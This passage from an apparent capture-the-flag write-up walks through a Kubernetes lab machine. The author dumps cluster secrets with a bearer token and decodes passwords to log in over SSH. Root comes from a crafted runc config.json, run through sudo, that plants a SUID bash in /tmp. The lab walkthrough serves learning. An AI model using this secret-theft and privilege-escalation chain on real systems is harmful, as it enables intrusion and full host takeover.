                  "f:meta.helm.sh/release-name": {},
                  "f:meta.helm.sh/release-namespace": {}
                },
                "f:labels": {
                  ".": {},
                  "f:app.kubernetes.io/instance": {},
                  "f:app.kubernetes.io/managed-by": {},
                  "f:app.kubernetes.io/name": {},
                  "f:app.kubernetes.io/part-of": {},
                  "f:app.kubernetes.io/version": {},
                  "f:helm.sh/chart": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "mariadb-password": "c1cxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "mariadb-root-password": "c1cxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "beta-vino-wp-wordpress",
        "namespace": "default",
        "uid": "1cbbc5ac-1611-46af-8033-09e98dfc546b",
        "resourceVersion": "2088228",
        "creationTimestamp": "2024-09-21T22:17:31Z",
        "labels": {
          "app.kubernetes.io/instance": "beta-vino-wp",
          "app.kubernetes.io/managed-by": "Helm",
          "app.kubernetes.io/name": "wordpress",
          "app.kubernetes.io/version": "6.8.2",
          "helm.sh/chart": "wordpress-25.0.5"
        },
        "annotations": {
          "meta.helm.sh/release-name": "beta-vino-wp",
          "meta.helm.sh/release-namespace": "default"
        },
        "managedFields": [
          {
            "manager": "helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-29T03:29:54Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:wordpress-password": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:meta.helm.sh/release-name": {},
                  "f:meta.helm.sh/release-namespace": {}
                },
                "f:labels": {
                  ".": {},
                  "f:app.kubernetes.io/instance": {},
                  "f:app.kubernetes.io/managed-by": {},
                  "f:app.kubernetes.io/name": {},
                  "f:app.kubernetes.io/version": {},
                  "f:helm.sh/chart": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "wordpress-password": "TzhGN0tSNXpHaQ=="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "sh.helm.release.v1.beta-vino-wp.v58",
        "namespace": "default",
        "uid": "13034cd4-64e1-4e2e-9182-4ce0ffda27e8",
        "resourceVersion": "2123405",
        "creationTimestamp": "2025-08-30T05:17:49Z",
        "labels": {
          "modifiedAt": "1726957051",
          "name": "beta-vino-wp",
          "owner": "helm",
          "status": "superseded",
          "version": "58"
        },
        "managedFields": [
          {
            "manager": "Helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-30T05:21:45Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:release": {}
              },
              "f:metadata": {
                "f:labels": {
                  ".": {},
                  "f:modifiedAt": {},
                  "f:name": {},
                  "f:owner": {},
                  "f:status": {},
                  "f:version": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
<SNIP>
{
      "metadata": {
        "name": "user-secret-babywyrm",
        "namespace": "default",
        "uid": "8a0265ca-1f25-4f4c-a9cd-9823b64971f9",
        "resourceVersion": "2856301",
        "creationTimestamp": "2025-11-03T13:11:40Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-babywyrm",
            "uid": "61cd8335-be44-4201-9554-1441ce307e07",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-11-03T13:11:40Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:MASTERPASS": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"61cd8335-be44-4201-9554-1441ce307e07\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "MASTERPASS": "TEFxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
      },
      "type": "Opaque"
    }
  ]
}
```

The results are quite long so these are these that really potiential so far. <br>
&rarr; As we got `user-secret-babywyrm`, let's check it out.

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://10.43.0.1:443/api/v1/namespaces/default/secrets/user-secret-babywyrm
{
  "kind": "Secret",
  "apiVersion": "v1",
  "metadata": {
    "name": "user-secret-babywyrm",
    "namespace": "default",
    "uid": "8a0265ca-1f25-4f4c-a9cd-9823b64971f9",
    "resourceVersion": "2856301",
    "creationTimestamp": "2025-11-03T13:11:40Z",
    "ownerReferences": [
      {
        "apiVersion": "bitnami.com/v1alpha1",
        "kind": "SealedSecret",
        "name": "user-secret-babywyrm",
        "uid": "61cd8335-be44-4201-9554-1441ce307e07",
        "controller": true
      }
    ],
    "managedFields": [
      {
        "manager": "controller",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2025-11-03T13:11:40Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:data": {
            ".": {},
            "f:MASTERPASS": {}
          },
          "f:metadata": {
            "f:ownerReferences": {
              ".": {},
              "k:{\"uid\":\"61cd8335-be44-4201-9554-1441ce307e07\"}": {}
            }
          },
          "f:type": {}
        }
      }
    ]
  },
  "data": {
    "MASTERPASS": "TEFxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
  },
  "type": "Opaque"
```

We got passowrd `TEFxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` seems to be encoded. <br>
&rarr; Let's decode it out.

```bash
└─$ echo 'TEFxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' | base64 -d                                                                                                          
LADxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

Now we got password and this one probably for `babywyrm`. <br>
&rarr; Let's `ssh` inside it.

```bash
└─$ ssh babywyrm@giveback.htb
babywyrm@giveback.htb's password: 
babywyrm@giveback:~$ ls -la
total 40
drwxr-x--- 5 babywyrm babywyrm 4096 Oct  2 20:28 .
drwxr-xr-x 3 root     root     4096 Sep 21  2024 ..
lrwxrwxrwx 1 root     root        9 Oct  2 20:28 .bash_history -> /dev/null
-rw-r--r-- 1 babywyrm babywyrm  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 babywyrm babywyrm 3919 Oct 26  2024 .bashrc
drwx------ 2 babywyrm babywyrm 4096 Sep 21  2024 .cache
drwx------ 4 babywyrm babywyrm 4096 Sep 21  2024 .config
-rw-r--r-- 1 babywyrm babywyrm  807 Jan  6  2022 .profile
drwx------ 2 babywyrm babywyrm 4096 Sep 21  2024 .ssh
-rw-r--r-- 1 babywyrm babywyrm    0 Sep 21  2024 .sudo_as_admin_successful
-rw-r--r-- 1 babywyrm babywyrm   45 Oct 16  2024 .wgetrc
-rw-r----- 1 root     babywyrm   33 Nov  3 13:11 user.txt
babywyrm@giveback:~$ cat user.txt
5390f7xxxxxxxxxxxxxxxxxxxxxxxxxx
```

Grab that `user.txt` flag.

## Initial Access
After doing some exploit through some cves to explore the services that we got our footage on `babywyrm`. <br>
&rarr; Gonna recon around to see stuffs that we can leverage to root.

### Discovery
```bash
babywyrm@giveback:~$ sudo -l
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, timestamp_timeout=0, timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```

Let's give it a run.

```bash
babywyrm@giveback:~$ sudo /opt/debug
[sudo] password for babywyrm: 
Validating sudo...
Please enter the administrative password: 

Incorrect password
```

Where could it be the passowrd for second one.

```bash
"data": {
        "mariadb-password": "c1cxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "mariadb-root-password": "c1cxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
      },
```

Checking back the result from that we get in `https://10.43.0.1:443/api/v1/namespaces/default/secrets`, they got password for it. <br>
Funny these is that when we got the password from the session we exploit with first cves, we found out this one.

```bash
<-5d8ff4f68c-lwcgm:/opt/bitnami/wordpress/wp-admin$ cat wp-config.php | grep -i "DB_"
<opt/bitnami/wordpress/wp-config.php | grep -i "DB_"
define( 'DB_NAME', 'bitnami_wordpress' );
define( 'DB_USER', 'bn_wordpress' );
define( 'DB_PASSWORD', 'sW5xxxxxxxxxxxxxxxxxxxxx' );
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );
```

```bash
└─$ echo -n 'sW5xxxxxxxxxxxxxxxxxxxxx' | base64   
c1cxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

And somehow this password is the encoded one for the one we found so that kinda weird. <br>
&rarr; Now let's run again.

```bash
babywyrm@giveback:~$ sudo  /opt/debug
Validating sudo...
Please enter the administrative password: 

Both passwords verified. Executing the command...
NAME:
   runc - Open Container Initiative runtime

runc is a command line client for running applications packaged according to
the Open Container Initiative (OCI) format and is a compliant implementation of the
Open Container Initiative specification.

runc integrates well with existing process supervisors to provide a production
container runtime environment for applications. It can be used with your
existing process monitoring tools and the container will be spawned as a
direct child of the process supervisor.

Containers are configured using bundles. A bundle for a container is a directory
that includes a specification file named "config.json" and a root filesystem.
The root filesystem contains the contents of the container.

To start a new instance of a container:

    # runc run [ -b bundle ] <container-id>

Where "<container-id>" is your name for the instance of the container that you
are starting. The name you provide for the container instance must be unique on
your host. Providing the bundle directory using "-b" is optional. The default
value for "bundle" is the current directory.

USAGE:
   runc.amd64.debug [global options] command [command options] [arguments...]

VERSION:
   1.1.11
commit: v1.1.11-0-g4bccb38c
spec: 1.0.2-dev
go: go1.20.12
libseccomp: 2.5.4

COMMANDS:
   checkpoint  checkpoint a running container
   create      create a container
   delete      delete any resources held by the container often used with detached container
   events      display container events such as OOM notifications, cpu, memory, and IO usage statistics
   exec        execute new process inside the container
   kill        kill sends the specified signal (default: SIGTERM) to the container's init process
   list        lists containers started by runc with the given root
   pause       pause suspends all processes inside the container
   ps          ps displays the processes running inside a container
   restore     restore a container from a previous checkpoint
   resume      resumes all processes that have been previously paused
   run         create and run a container
   spec        create a new specification file
   start       executes the user defined process in a created container
   state       output the state of a container
   update      update container resource constraints
   features    show the enabled features
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug             enable debug logging
   --log value         set the log file to write runc logs to (default is '/dev/stderr')
   --log-format value  set the log format ('text' (default), or 'json') (default: "text")
   --root value        root directory for storage of container state (this should be located in tmpfs) (default: "/run/runc")
   --criu value        path to the criu binary used for checkpoint and restore (default: "criu")
   --systemd-cgroup    enable systemd cgroup support, expects cgroupsPath to be of form "slice:prefix:name" for e.g. "system.slice:runc:434234"
   --rootless value    ignore cgroup permission errors ('true', 'false', or 'auto') (default: "auto")
   --help, -h          show help
   --version, -v       print the version
```

So runc is like Low-level container runtime and also implement OCI (Open Container Initiative) specification and this one used by Docker, containerd and Kubernetes. <br>
&rarr; Let's run the spec to get the config file.

```bash
babywyrm@giveback:~$ runc spec
babywyrm@giveback:~$ ls -la
total 44
drwxr-x--- 5 babywyrm babywyrm 4096 Nov  3 14:39 .
drwxr-xr-x 3 root     root     4096 Sep 21  2024 ..
lrwxrwxrwx 1 root     root        9 Oct  2 20:28 .bash_history -> /dev/null
-rw-r--r-- 1 babywyrm babywyrm  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 babywyrm babywyrm 3919 Oct 26  2024 .bashrc
drwx------ 2 babywyrm babywyrm 4096 Sep 21  2024 .cache
drwx------ 4 babywyrm babywyrm 4096 Sep 21  2024 .config
-rw-r--r-- 1 babywyrm babywyrm  807 Jan  6  2022 .profile
drwx------ 2 babywyrm babywyrm 4096 Sep 21  2024 .ssh
-rw-r--r-- 1 babywyrm babywyrm    0 Sep 21  2024 .sudo_as_admin_successful
-rw-r--r-- 1 babywyrm babywyrm   45 Oct 16  2024 .wgetrc
-rw-rw-r-- 1 babywyrm babywyrm 2500 Nov  3 14:39 config.json
-rw-r----- 1 root     babywyrm   33 Nov  3 13:11 user.txt
```

```bash
babywyrm@giveback:~$ cat config.json
{
        "ociVersion": "1.2.1",
        "process": {
                "terminal": true,
                "user": {
                        "uid": 0,
                        "gid": 0
                },
                "args": [
                        "sh"
                ],
                "env": [
                        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                        "TERM=xterm"
                ],
                "cwd": "/",
                "capabilities": {
                        "bounding": [
                                "CAP_AUDIT_WRITE",
                                "CAP_KILL",
                                "CAP_NET_BIND_SERVICE"
                        ],
                        "effective": [
                                "CAP_AUDIT_WRITE",
                                "CAP_KILL",
                                "CAP_NET_BIND_SERVICE"
                        ],
                        "permitted": [
                                "CAP_AUDIT_WRITE",
                                "CAP_KILL",
                                "CAP_NET_BIND_SERVICE"
                        ]
                },
                "rlimits": [
                        {
                                "type": "RLIMIT_NOFILE",
                                "hard": 1024,
                                "soft": 1024
                        }
                ],
                "noNewPrivileges": true
        },
        "root": {
                "path": "rootfs",
                "readonly": true
        },
        "hostname": "runc",
        "mounts": [
                {
                        "destination": "/proc",
                        "type": "proc",
                        "source": "proc"
                },
                {
                        "destination": "/dev",
                        "type": "tmpfs",
                        "source": "tmpfs",
                        "options": [
                                "nosuid",
                                "strictatime",
                                "mode=755",
                                "size=65536k"
                        ]
                },
                {
                        "destination": "/dev/pts",
                        "type": "devpts",
                        "source": "devpts",
                        "options": [
                                "nosuid",
                                "noexec",
                                "newinstance",
                                "ptmxmode=0666",
                                "mode=0620",
                                "gid=5"
                        ]
                },
                {
                        "destination": "/dev/shm",
                        "type": "tmpfs",
                        "source": "shm",
                        "options": [
                                "nosuid",
                                "noexec",
                                "nodev",
                                "mode=1777",
                                "size=65536k"
                        ]
                },
                {
                        "destination": "/dev/mqueue",
                        "type": "mqueue",
                        "source": "mqueue",
                        "options": [
                                "nosuid",
                                "noexec",
                                "nodev"
                        ]
                },
                {
                        "destination": "/sys",
                        "type": "sysfs",
                        "source": "sysfs",
                        "options": [
                                "nosuid",
                                "noexec",
                                "nodev",
                                "ro"
                        ]
                },
                {
                        "destination": "/sys/fs/cgroup",
                        "type": "cgroup",
                        "source": "cgroup",
                        "options": [
                                "nosuid",
                                "noexec",
                                "nodev",
                                "relatime",
                                "ro"
                        ]
                }
        ],
        "linux": {
                "resources": {
                        "devices": [
                                {
                                        "allow": false,
                                        "access": "rwm"
                                }
                        ]
                },
                "namespaces": [
                        {
                                "type": "pid"
                        },
                        {
                                "type": "network"
                        },
                        {
                                "type": "ipc"
                        },
                        {
                                "type": "uts"
                        },
                        {
                                "type": "mount"
                        },
                        {
                                "type": "cgroup"
                        }
                ],
                "maskedPaths": [
                        "/proc/acpi",
                        "/proc/asound",
                        "/proc/kcore",
                        "/proc/keys",
                        "/proc/latency_stats",
                        "/proc/timer_list",
                        "/proc/timer_stats",
                        "/proc/sched_debug",
                        "/sys/firmware",
                        "/proc/scsi"
                ],
                "readonlyPaths": [
                        "/proc/bus",
                        "/proc/fs",
                        "/proc/irq",
                        "/proc/sys",
                        "/proc/sysrq-trigger"
                ]
        }
}
```

From these, we can leverage this config file to escalated to root.

## Privilege Escalation
So we gonna modified the `config.json` that will specify to run as root, mount the `/root` into container then we create suid binary.

### runc
```bash
babywyrm@giveback:~$ mkdir -p root/rootfs
babywyrm@giveback:~$ cd root/
babywyrm@giveback:~/root$ cat > config.json << 'EOF'
{
  "ociVersion": "1.0.2",
  "process": {
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/sh", "-c", "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"],
    "cwd": "/",
    "env": ["PATH=/bin:/usr/bin"],
    "terminal": false
  },
  "root": {"path": "rootfs"},
  "mounts": [
    {"destination": "/proc", "type": "proc", "source": "proc"},
    {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind","ro"]},
    {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind","ro"]},
    {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind","ro"]},
    {"destination": "/tmp", "type": "bind", "source": "/tmp", "options": ["bind","rw"]}
  ],
  "linux": {"namespaces": [{"type": "mount"}]}
}
EOF
```

Now we will run the `sudo /opt/debug` again this in `/root` so that it will execute the suid so that we can escalated to root.

```bash
babywyrm@giveback:~/root$ sudo /opt/debug run x
Validating sudo...
Please enter the administrative password: 

Both passwords verified. Executing the command...
```

```bash
babywyrm@giveback:~/root$ /tmp/rootbash -p
rootbash-5.1# whoami
root
rootbash-5.1# id
uid=1000(babywyrm) gid=1000(babywyrm) euid=0(root) groups=1000(babywyrm),4(adm),30(dip)
```

There we go, we got ourself into `root`.

```bash
rootbash-5.1# cd root
rootbash-5.1# ls -la
total 100
drwx------ 15 root root 4096 Nov  3 13:11 .
drwxr-xr-x 20 root root 4096 Oct  3 16:21 ..
lrwxrwxrwx  1 root root    9 Oct  2 20:28 .bash_history -> /dev/null
-rw-r--r--  1 root root 3286 Oct 20  2024 .bashrc
drwx------  4 root root 4096 Sep 21  2024 .cache
drwx------  5 root root 4096 Sep 21  2024 .config
drwx------  3 root root 4096 Jul 24 00:59 .docker
drwxr-x---  3 root root 4096 Sep 21  2024 .kube
-rw-------  1 root root   20 Oct 27 15:52 .lesshst
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root    0 Sep 25  2024 .selected_editor
drwx------  2 root root 4096 Sep 28  2024 .ssh
-rw-r--r--  1 root root    0 Sep 21  2024 .sudo_as_admin_successful
drwxr-xr-x  2 root root 4096 Sep 29  2024 .vim
-rw-r--r--  1 root root   14 Oct 16  2024 .vimrc
-rw-r--r--  1 root root   46 Oct 16  2024 .wgetrc
drwxr-xr-x  3 root root 4096 Sep 24 20:06 HTB
-rwx------  1 root root 5001 Jul 27 03:47 audit__.sh
drwxr-xr-x  2 root root 4096 Aug 29 03:16 coredns
-rwxr-xr-x  1 root root  416 Oct 27 09:44 dns.sh
drwxr-x---  3 root root 4096 Jul 30 03:09 helm
-rwxr-xr-x  1 root root  382 Oct  1 14:00 iptables_rules.sh
drwxr-x---  2 root root 4096 Sep 23  2024 kubeseal
drwxr-x---  3 root root 4096 Aug  2 17:01 phpcgi
drwxr-x---  4 root root 4096 Nov 14  2024 python
-rw-r-----  1 root root   33 Nov  3 13:11 root.txt
drwxr-x---  4 root root 4096 Sep 24 20:02 wordpress
rootbash-5.1# cat root.txt
a4ab2dxxxxxxxxxxxxxxxxxxxxxxxxxx
```

Got our `root.txt` flag.

> *Throughout this machine, we got to know more about kubernetes services and also awsome cves about `Argument Injection in PHP-CGI`.*

![result](/assets/img/giveback-htb-season9/result.png)